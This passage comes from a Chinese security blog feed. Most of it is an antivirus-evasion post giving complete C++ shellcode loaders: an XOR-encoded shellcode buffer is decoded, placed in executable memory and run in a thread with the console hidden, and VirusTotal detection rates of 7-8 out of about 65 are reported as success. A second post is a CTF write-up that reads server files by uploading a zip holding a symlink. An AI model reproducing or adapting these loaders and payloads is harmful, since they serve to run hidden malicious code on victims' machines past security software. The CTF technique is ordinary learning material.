xe0\x50\xab\x5d\x66\x37\x16\xee\xc4\x59\x20\xd8\x59\x20\xc3\x5c\x20\xd1\x5c\x20\xd8\x50\x41\x50\x41\x50\xab\x2b\x47\x68\xb6\xee\xc4\xfa\x62\x4b\x59\x98\xd0\x50\xa9\x41\x11\x11\x11\x5c\x20\xd8\x50\x40\x50\x40\x7b\x12\x50\x40\x50\xab\x46\x98\x8e\xd7\xee\xc4\xfa\x48\x4a\x59\x98\xd0\x59\x20\xc3\x58\x98\xc9\x5c\x20\xd8\x43\x79\x11\x13\x51\x95\x43\x43\x50\xab\xfa\x44\x3f\x2a\xee\xc4\x59\x98\xd7\x59\x92\xd2\x41\x7b\x1b\x4e\x59\x98\xe0\x59\x98\xcb\x58\xd6\xd1\xee\xee\xee\xee\x5c\x20\xd8\x43\x43\x50\xab\x3c\x17\x09\x6a\xee\xc4\x94\xd1\x1e\x94\x8c\x10\x11\x11\x59\xee\xde\x1e\x95\x9d\x10\x11\x11\xfa\xc2\xf8\xf5\x10\x11\x11\xf9\xb3\xee\xee\xee\x3e\x5e\x78\x53\x72\x11\x2a\xab\x16\xdb\x1f\x60\x28\x5c\xe5\x62\xb1\x74\x71\xad\x51\x34\xb1\x06\x40\xa2\xdd\xf4\x68\x3e\xea\x31\x08\xb9\x0b\x49\x69\x75\x5f\xe6\x03\xfe\x0c\x1f\xfd\xf0\xe4\x74\x06\xd4\x3e\xf6\x93\xaa\x4f\x88\xb2\x41\x9a\x35\x9a\x8d\xe7\x05\xfa\x92\x5c\x94\x14\x94\x99\xe2\x1d\x90\xa0\x7b\x4b\x6c\x6a\x11\x44\x62\x74\x63\x3c\x50\x76\x74\x7f\x65\x2b\x31\x5c\x7e\x6b\x78\x7d\x7d\x70\x3e\x25\x3f\x21\x31\x39\x72\x7e\x7c\x61\x70\x65\x78\x73\x7d\x74\x2a\x31\x5c\x42\x58\x54\x31\x29\x3f\x21\x2a\x31\x46\x78\x7f\x75\x7e\x66\x62\x31\x5f\x45\x31\x27\x3f\x20\x2a\x31\x46\x5e\x46\x27\x25\x2a\x31\x45\x63\x78\x75\x74\x7f\x65\x3e\x25\x3f\x21\x2a\x31\x42\x5d\x52\x52\x23\x2a\x31\x3f\x5f\x54\x45\x31\x52\x5d\x43\x31\x23\x3f\x21\x3f\x24\x21\x26\x23\x26\x38\x1c\x1b\x11\x78\x8a\xf1\x6f\xa3\xa7\x29\x7b\xad\x72\x4f\xe8\x94\x8d\x33\x75\x06\x51\x4b\x26\x67\xf1\x71\x15\x45\xe2\x7b\x74\x1a\x7f\x0f\x81\x96\xa8\xfa\xe8\x94\x1a\x33\xc6\x75\x51\x6d\x67\x45\xc7\x36\x6d\x09\x3d\x86\x56\x4c\x1d\x42\x9f\xd9\xfd\xdd\x11\xcf\xec\xf9\x76\x91\xaa\xf4\xd7\x70\x05\x02\x2d\x30\x5f\x17\xe8\xc8\x30\xb6\x8c\x5f\x72\xd9\x2a\xbf\x7f\xe3\xf2\x49\x38\x05\x8b\xa0\xfd\xcc\xd7\xf5\x73\xc1\x30\x6d\xf5\xde\x30\x40\xec\x07\x6e\xdc\xef\x79\xcd\xcb\x06\x0d\xe6\xba\x24\x68\x54\x20\x06\xe0\x21\xec\xcc\x5e\xec\x24\xde\x85\xbb\xac\xda\x02\x59\xc2\xb4\x3e\xa9\x89\xfc\x74\x45\x09\x24\xa3\x2d\x32\x0a\x9c\xa5\x1c\x73\xde\xf0\x8a\x6a\xf6\x72\x3b\x97\x9c\x07\xf5\xcb\xea\xb5\x12\x5a\x9f\x0f\x12\x12\xb2\x5c\x00\x0c\x3b\xaa\xd8\xf0\xae\xa1\xb4\x32\x1c\xc7\x7c\x25\x88\x11\x50\xaf\xe1\xa4\xb3\x47\xee\xc4\x59\x20\xd8\xab\x11\x11\x51\x11\x50\xa9\x11\x01\x11\x11\x50\xa8\x51\x11\x11\x11\x50\xab\x49\xb5\x42\xf4\xee\xc4\x59\x82\x42\x42\x59\x98\xf6\x59\x98\xe0\x59\x98\xcb\x50\xa9\x11\x31\x11\x11\x58\x98\xe8\x50\xab\x03\x87\x98\xf3\xee\xc4\x59\x92\xd5\x31\x94\xd1\x65\xa7\x77\x9a\x16\x59\x10\xd2\x94\xd1\x64\xc6\x49\x49\x49\x59\x14\x11\x11\x11\x11\x41\xd2\xf9\x8e\xec\xee\xee\x20\x28\x23\x3f\x20\x27\x29\x3f\x23\x25\x29\x3f\x20\x11\x40\x18\xae\x7c\x11&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">     shellcode_size = <span class="built_in"><span class="keyword">sizeof</span></span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//shellcode xor后解密，密码为17,解密后使用virtualalloc分配虚拟内存</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i] = buf[i] ^ <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="免杀效果-8-66"><a href="#免杀效果-8-66" class="headerlink" title="免杀效果 8/66"></a>免杀效果 8/66</h2><p>b07db5b474a3e42e444299f28a71e6fd8d5cf808d91d2680e4bece8d4bd89fc4</p><p><img src="http://cdn.polowong.top/image-20211202152602331.png" alt="image-20211202152602331"></p><h1 id="简单加载器-修改内存页属性-sleep-shellcode-xor异或-去掉cmd黑框"><a href="#简单加载器-修改内存页属性-sleep-shellcode-xor异或-去掉cmd黑框" class="headerlink" title="简单加载器+修改内存页属性+sleep+shellcode xor异或+去掉cmd黑框"></a>简单加载器+修改内存页属性+sleep+shellcode xor异或+去掉cmd黑框</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/INCREMENTAL:NO&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xed\x59\x92\xf5\xe1\xf9\xd9\x11\x11\x11\x50\x40\x50\x41\x43\x40\x47\x59\x20\xc3\x74\x59\x9a\x43\x71\x59\x9a\x43\x09\x59\x9a\x43\x31\x59\x9a\x63\x41\x59\x1e\xa6\x5b\x5b\x5c\x20\xd8\x59\x20\xd1\xbd\x2d\x70\x6d\x13\x3d\x31\x50\xd0\xd8\x1c\x50\x10\xd0\xf3\xfc\x43\x50\x40\x59\x9a\x43\x31\x9a\x53\x2d\x59\x10\xc1\x77\x90\x69\x09\x1a\x13\x64\x63\x9a\x91\x99\x11\x11\x11\x59\x94\xd1\x65\x76\x59\x10\xc1\x41\x9a\x59\x09\x55\x9a\x51\x31\x58\x10\xc1\xf2\x47\x59\xee\xd8\x50\x9a\x25\x99\x59\x10\xc7\x5c\x20\xd8\x59\x20\xd1\xbd\x50\xd0\xd8\x1c\x50\x10\xd0\x29\xf1\x64\xe0\x5d\x12\x5d\x35\x19\x54\x28\xc0\x64\xc9\x49\x55\x9a\x51\x35\x58\x10\xc1\x77\x50\x9a\x1d\x59\x55\x9a\x51\x0d\x58\x10\xc1\x50\x9a\x15\x99\x59\x10\xc1\x50\x49\x50\x49\x4f\x48\x4b\x50\x49\x50\x48\x50\x4b\x59\x92\xfd\x31\x50\x43\xee\xf1\x49\x50\x48\x4b\x59\x9a\x03\xf8\x5e\xee\xee\xee\x4c\x7b\x11\x58\xaf\x66\x78\x7f\x78\x7f\x74\x65\x11\x50\x47\x58\x98\xf7\x5d\x98\xe0\x50\xab\x5d\x66\x37\x16\xee\xc4\x59\x20\xd8\x59\x20\xc3\x5c\x20\xd1\x5c\x20\xd8\x50\x41\x50\x41\x50\xab\x2b\x47\x68\xb6\xee\xc4\xfa\x62\x4b\x59\x98\xd0\x50\xa9\x41\x11\x11\x11\x5c\x20\xd8\x50\x40\x50\x40\x7b\x12\x50\x40\x50\xab\x46\x98\x8e\xd7\xee\xc4\xfa\x48\x4a\x59\x98\xd0\x59\x20\xc3\x58\x98\xc9\x5c\x20\xd8\x43\x79\x11\x13\x51\x95\x43\x43\x50\xab\xfa\x44\x3f\x2a\xee\xc4\x59\x98\xd7\x59\x92\xd2\x41\x7b\x1b\x4e\x59\x98\xe0\x59\x98\xcb\x58\xd6\xd1\xee\xee\xee\xee\x5c\x20\xd8\x43\x43\x50\xab\x3c\x17\x09\x6a\xee\xc4\x94\xd1\x1e\x94\x8c\x10\x11\x11\x59\xee\xde\x1e\x95\x9d\x10\x11\x11\xfa\xc2\xf8\xf5\x10\x11\x11\xf9\xb3\xee\xee\xee\x3e\x5e\x78\x53\x72\x11\x2a\xab\x16\xdb\x1f\x60\x28\x5c\xe5\x62\xb1\x74\x71\xad\x51\x34\xb1\x06\x40\xa2\xdd\xf4\x68\x3e\xea\x31\x08\xb9\x0b\x49\x69\x75\x5f\xe6\x03\xfe\x0c\x1f\xfd\xf0\xe4\x74\x06\xd4\x3e\xf6\x93\xaa\x4f\x88\xb2\x41\x9a\x35\x9a\x8d\xe7\x05\xfa\x92\x5c\x94\x14\x94\x99\xe2\x1d\x90\xa0\x7b\x4b\x6c\x6a\x11\x44\x62\x74\x63\x3c\x50\x76\x74\x7f\x65\x2b\x31\x5c\x7e\x6b\x78\x7d\x7d\x70\x3e\x25\x3f\x21\x31\x39\x72\x7e\x7c\x61\x70\x65\x78\x73\x7d\x74\x2a\x31\x5c\x42\x58\x54\x31\x29\x3f\x21\x2a\x31\x46\x78\x7f\x75\x7e\x66\x62\x31\x5f\x45\x31\x27\x3f\x20\x2a\x31\x46\x5e\x46\x27\x25\x2a\x31\x45\x63\x78\x75\x74\x7f\x65\x3e\x25\x3f\x21\x2a\x31\x42\x5d\x52\x52\x23\x2a\x31\x3f\x5f\x54\x45\x31\x52\x5d\x43\x31\x23\x3f\x21\x3f\x24\x21\x26\x23\x26\x38\x1c\x1b\x11\x78\x8a\xf1\x6f\xa3\xa7\x29\x7b\xad\x72\x4f\xe8\x94\x8d\x33\x75\x06\x51\x4b\x26\x67\xf1\x71\x15\x45\xe2\x7b\x74\x1a\x7f\x0f\x81\x96\xa8\xfa\xe8\x94\x1a\x33\xc6\x75\x51\x6d\x67\x45\xc7\x36\x6d\x09\x3d\x86\x56\x4c\x1d\x42\x9f\xd9\xfd\xdd\x11\xcf\xec\xf9\x76\x91\xaa\xf4\xd7\x70\x05\x02\x2d\x30\x5f\x17\xe8\xc8\x30\xb6\x8c\x5f\x72\xd9\x2a\xbf\x7f\xe3\xf2\x49\x38\x05\x8b\xa0\xfd\xcc\xd7\xf5\x73\xc1\x30\x6d\xf5\xde\x30\x40\xec\x07\x6e\xdc\xef\x79\xcd\xcb\x06\x0d\xe6\xba\x24\x68\x54\x20\x06\xe0\x21\xec\xcc\x5e\xec\x24\xde\x85\xbb\xac\xda\x02\x59\xc2\xb4\x3e\xa9\x89\xfc\x74\x45\x09\x24\xa3\x2d\x32\x0a\x9c\xa5\x1c\x73\xde\xf0\x8a\x6a\xf6\x72\x3b\x97\x9c\x07\xf5\xcb\xea\xb5\x12\x5a\x9f\x0f\x12\x12\xb2\x5c\x00\x0c\x3b\xaa\xd8\xf0\xae\xa1\xb4\x32\x1c\xc7\x7c\x25\x88\x11\x50\xaf\xe1\xa4\xb3\x47\xee\xc4\x59\x20\xd8\xab\x11\x11\x51\x11\x50\xa9\x11\x01\x11\x11\x50\xa8\x51\x11\x11\x11\x50\xab\x49\xb5\x42\xf4\xee\xc4\x59\x82\x42\x42\x59\x98\xf6\x59\x98\xe0\x59\x98\xcb\x50\xa9\x11\x31\x11\x11\x58\x98\xe8\x50\xab\x03\x87\x98\xf3\xee\xc4\x59\x92\xd5\x31\x94\xd1\x65\xa7\x77\x9a\x16\x59\x10\xd2\x94\xd1\x64\xc6\x49\x49\x49\x59\x14\x11\x11\x11\x11\x41\xd2\xf9\x8e\xec\xee\xee\x20\x28\x23\x3f\x20\x27\x29\x3f\x23\x25\x29\x3f\x20\x11\x40\x18\xae\x7c\x11&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">     shellcode_size = <span class="built_in"><span class="keyword">sizeof</span></span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//shellcode xor后解密，密码为17,解密后使用virtualalloc分配虚拟内存</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i] = buf[i] ^ <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="免杀效果VT-7-64"><a href="#免杀效果VT-7-64" class="headerlink" title="免杀效果VT 7/64"></a>免杀效果VT 7/64</h2><p><img src="http://cdn.polowong.top/image-20211202161158893.png" alt="image-20211202161158893"></p><p>a7a87509ad387960dedd08a609db3fe3c935cefc52b8ae97f5b761b1ac6ff7d3</p><h1 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h1><p>本次更新于2021.12.2，静态免杀效果VT 7/64，期末了，要准备期末考试，还要看论文，只能每天抽点时间去学相关知识。</p><h1 id="todo："><a href="#todo：" class="headerlink" title="todo："></a>todo：</h1><p>远程加载shellcode</p><p>更高级的shellcode混淆方法（对称加密）</p><p>ctf 隐写shellcode？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;前言&lt;/p&gt;
&lt;p&gt;其实一直对免杀挺感兴趣的，但一直没有下定决心系统的学习，只是半路拿来别人写的过来用一下，所以这次想从最基本的方法开始学习免杀，作为一个记录贴将持续更新免杀方法、代码以及其中我没掌握的知识点。&lt;/p&gt;
&lt;/blockquote&gt;
</summary>
      
    
    
    
    
    <category term="免杀" scheme="https://polosec.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>一道简单的flask-web题</title>
    <link href="https://polosec.github.io/2021/11/25/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84flask-web%E9%A2%98/"/>
    <id>https://polosec.github.io/2021/11/25/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84flask-web%E9%A2%98/</id>
    <published>2021-11-25T07:36:34.000Z</published>
    <updated>2021-11-25T07:41:15.416Z</updated>
    
    <content type="html"><![CDATA[<p>PKU的一道简单flask web题 感觉挺有意思的<br>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> shutil <span class="keyword">import</span> copyfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,url_for,send_from_directory,make_response,redirect</span><br><span class="line"><span class="keyword">from</span> werkzeug.middleware.proxy_fix <span class="keyword">import</span> ProxyFix</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&#x27;TEMP&#x27;</span>]=<span class="string">&#x27;/dev/shm&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(<span class="string">&quot;access&quot;</span>)</span><br><span class="line">app.wsgi_app = ProxyFix(app.wsgi_app, x_for=<span class="number">1</span> ,x_proto=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        os.system(<span class="string">&quot;rm -rf /dev/shm/zip/media/*&quot;</span>)</span><br><span class="line">        path=os.path.join(<span class="string">&quot;/dev/shm/zip/media&quot;</span>,<span class="string">&#x27;tmp.zip&#x27;</span>)<span class="comment"># 拼接文件路径</span></span><br><span class="line">        f.save(path)</span><br><span class="line">        os.system(<span class="string">&#x27;timeout -k 1 3 unzip /dev/shm/zip/media/tmp.zip -d /dev/shm/zip/media/&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;rm /dev/shm/zip/media/tmp.zip&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/media/&#x27;</span>)</span><br><span class="line">    response = render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/media/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/media&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/media/&lt;path&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">media</span>(<span class="params">path=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    npath=os.path.join(<span class="string">&quot;/dev/shm/zip/media&quot;</span>,path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(npath):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;404&quot;</span>,<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(npath):</span><br><span class="line">        f=<span class="built_in">open</span>(npath,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        response = make_response(f.read())</span><br><span class="line">        response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fn=os.listdir(npath)</span><br><span class="line">        fn=[<span class="string">&quot;..&quot;</span>]+fn</span><br><span class="line">        f=<span class="built_in">open</span>(<span class="string">&quot;templates/template.html&quot;</span>)</span><br><span class="line">        x=f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        ret=<span class="string">&quot;&lt;h1&gt;文件列表:&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> fn:</span><br><span class="line">            tpath=os.path.join(<span class="string">&#x27;/media/&#x27;</span>,path,i)</span><br><span class="line">            ret+=<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+tpath+<span class="string">&quot;&#x27;&gt;&quot;</span>+i+<span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span></span><br><span class="line">        x=x.replace(<span class="string">&quot;HTMLTEXT&quot;</span>,ret)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;mkdir /dev/shm/zip&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;mkdir /dev/shm/zip/media&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8080</span>,debug=<span class="literal">False</span>,threaded=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大意为用户上传一个zip压缩包，服务器端解压后显示压缩包内的内容并且可以下载<img src="http://cdn.polowong.top/1637825858176qkyykata.png?imageslim" alt="paste image">类似这样。</p><p>我们可以利用Linux的软链接实现文件读取<img src="http://cdn.polowong.top/1637825912925e5ctiogo.png?imageslim" alt="paste image">下面制作一个存在软连接的zip压缩包</p><p>zip flag.zip flag –symlinks</p><p><img src="http://cdn.polowong.top/1637826007843qmy578le.png?imageslim" alt="paste image">直接下载文件得到读取的flag文件</p><p>flag{NeV3r_trUSt_Any_C0mprEsSEd_File}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PKU的一道简单flask web题 感觉挺有意思的&lt;br&gt;代码如下&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>广东省强网杯运维赛部分WP</title>
    <link href="https://polosec.github.io/2021/11/15/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86WP/"/>
    <id>https://polosec.github.io/2021/11/15/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86WP/</id>
    <published>2021-11-15T12:45:56.000Z</published>
    <updated>2021-11-15T13:41:41.374Z</updated>
    
